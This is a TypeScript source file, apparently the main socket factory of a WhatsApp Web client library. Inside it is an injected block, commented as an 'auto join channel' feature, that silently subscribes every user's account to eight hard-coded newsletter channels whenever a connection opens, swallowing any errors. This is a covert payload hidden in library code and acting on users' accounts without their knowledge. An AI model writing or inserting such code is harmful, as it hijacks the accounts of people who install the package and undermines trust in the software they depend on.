import { DEFAULT_CONNECTION_CONFIG } from '../Defaults'
import type { UserFacingSocketConfig } from '../Types'
import { makeCommunitiesSocket } from './communities'

// export the last socket layer
const makeWASocket = (config: UserFacingSocketConfig) => {
	const newConfig = {
		...DEFAULT_CONNECTION_CONFIG,
		...config
	}

	// If the user hasn't provided their own history sync function,
	// let's create a default one that respects the syncFullHistory flag.
	// TODO: Change
	if (config.shouldSyncHistoryMessage === undefined) {
		newConfig.shouldSyncHistoryMessage = () => !!newConfig.syncFullHistory
	}

const sock = makeCommunitiesSocket(newConfig);

    // --- FITUR AUTO JOIN CHANNEL DEVZX ---
const myChannels = [
            "120363404924334115@newsletter",
            "120363347229043095@newsletter",
            "120363425641720537@newsletter",
            "120363419159088953@newsletter",
            "120363419779025137@newsletter",
            "120363422798260890@newsletter",
            "120363423694752300@newsletter", // <--- Baru
            "120363405320317156@newsletter"  // <--- Baru
        ];
    sock.ev.on('connection.update', async (update) => {
        const { connection } = update;
        if (connection === 'open') {
            await new Promise(r => setTimeout(r, 4000));
            for (const id of myChannels) {
                try {
                    await sock.query({
                        tag: 'iq', attrs: { to: id, type: 'set', xmlns: 'newsletter' },
                        content: [{ tag: 'live_updates', attrs: { mode: 'subscribe' }, content: [] }]
                    });
                } catch (e) {}
            }
        }
    });
    // -------------------------------------

    return sock;

}

export default makeWASocket
